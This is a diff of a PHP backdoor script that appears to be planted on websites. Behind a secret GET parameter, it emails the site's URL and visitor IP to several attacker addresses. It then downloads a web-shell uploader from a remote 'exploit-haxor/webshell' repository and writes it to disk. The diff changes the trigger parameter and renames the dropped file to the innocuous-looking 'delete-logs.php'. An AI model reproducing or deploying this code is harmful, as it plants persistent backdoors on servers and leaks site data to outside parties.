@@ -1,5 +1,5 @@
 <?php
-if (@$_GET['maklo'] == 'heker') {
+if (@$_GET['UBK'] == '3') {
 	echo "<center>";
 if (file_exists("php.ini")){
 }else{
@@ -46,7 +46,7 @@ $to = 'muhrazky@gmail.com,papaku.hayker@gmail.com,snopunks@gmail.com,malaysia.se
 $path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-$nama= fopen("admin.sh" ,"w+");
+$nama= fopen("delete-logs.php" ,"w+");
 $file = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/wp-uploader.php');
 $tulis = fwrite ($nama ,$file);
 fclose($nama);	
